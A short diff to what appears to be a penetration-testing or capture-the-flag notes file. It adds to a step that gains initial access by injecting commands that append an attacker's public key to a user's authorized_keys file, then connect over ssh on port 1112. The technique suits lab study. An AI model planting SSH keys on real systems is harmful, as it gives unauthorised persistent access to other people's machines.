@@ -111,7 +111,8 @@ To gain initial access with ssh RSA key:
   on target >ls -la /home/billybob ##check if there is an .ssh file here, if not 
             >;mkdir /home/billybob/.ssh
             >;echo "your_public_key_here" >> /home/billybob/.ssh/authorized_keys
-            >;cat /home/billybob/.ssh/authorized_keys
+            >;cat /home/billybob/.ssh/authorized_keys ## to make sure it there 
+  >ssh billybob@127.0.0.1 -p 1112 ## this port is the one thats the ssh open on the IP
 
 
                                                               Scinerio  
